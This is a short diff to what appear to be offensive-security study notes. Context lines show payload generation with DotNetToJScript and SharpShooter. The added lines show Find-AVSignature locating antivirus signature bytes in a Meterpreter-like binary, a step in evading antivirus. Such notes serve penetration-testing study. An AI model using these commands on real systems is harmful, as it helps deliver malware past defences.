@@ -34,3 +34,10 @@ DotNetToJScript.exe ExampleAssembly.dll --lang=vbscript --ver=v4 -o demo.vbs
 └─$ sudo python SharpShooter.py --payload js --dotnetver 4 --stageless --rawscfile /var/www/html/shell.txt --output test
 
 ```
+
+# AV
+## Find signature
+```
+Import-Module .\Find-AVSignature.ps1
+Find-AVSignature -StartByte 0 -EndByte max -Interval 10000 -Path C:\Tools\met.exe -OutPath C:\Tools\avtest1 -Verbose -Force
+```
